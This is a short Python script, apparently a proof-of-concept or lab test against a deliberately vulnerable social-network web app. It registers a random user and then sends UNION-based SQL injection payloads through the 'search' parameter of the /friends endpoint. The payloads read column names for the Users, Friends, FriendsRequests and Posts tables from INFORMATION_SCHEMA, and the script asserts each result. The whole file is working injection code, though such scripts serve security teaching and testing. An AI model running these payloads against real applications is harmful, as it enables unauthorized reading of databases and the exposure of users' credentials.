from requests import session, get
from sys import argv
from random import randint

SERVER = argv[1]

s = session()
username = str(randint(2 ** 27, 2 ** 28))
password = str(randint(2 ** 27, 2 ** 28))

# Cleaning DB
r = get(SERVER + "/init")
assert "Initialisation DONE!" in r.text

data = {
    "username": username,
    "password": password
}
r = s.post(SERVER + "/register", data=data)

assert "Welcome" in r.text
assert username in r.text

params = {
    "search": "' AND 1 <> 1 UNION SELECT COLUMN_NAME, 1, 1, 1, 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "
              "'Users' -- "
}
r = s.get(SERVER + "/friends", params=params)

assert "Found 5" in r.text
assert "username" in r.text
assert "password" in r.text
assert "name" in r.text
assert "about" in r.text
assert "photo" in r.text

params = {
    "search": "' AND 1 <> 1 UNION SELECT COLUMN_NAME, 1, 1, 1, 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "
              "'Friends' -- "
}
r = s.get(SERVER + "/friends", params=params)

assert "Found 3" in r.text
assert "id" in r.text
assert "username1" in r.text
assert "username2" in r.text

params = {
    "search": "' AND 1 <> 1 UNION SELECT COLUMN_NAME, 1, 1, 1, 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "
              "'FriendsRequests' -- "
}
r = s.get(SERVER + "/friends", params=params)

assert "Found 3" in r.text
assert "id" in r.text
assert "username1" in r.text
assert "username2" in r.text

params = {
    "search": "' AND 1 <> 1 UNION SELECT COLUMN_NAME, 1, 1, 1, 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "
              "'Posts' -- "
}
r = s.get(SERVER + "/friends", params=params)

assert "Found 6" in r.text
assert "id" in r.text
assert "author" in r.text
assert "content" in r.text
assert "type" in r.text
assert "created_at" in r.text
assert "updated_at" in r.text

print("Success!")
s.close()
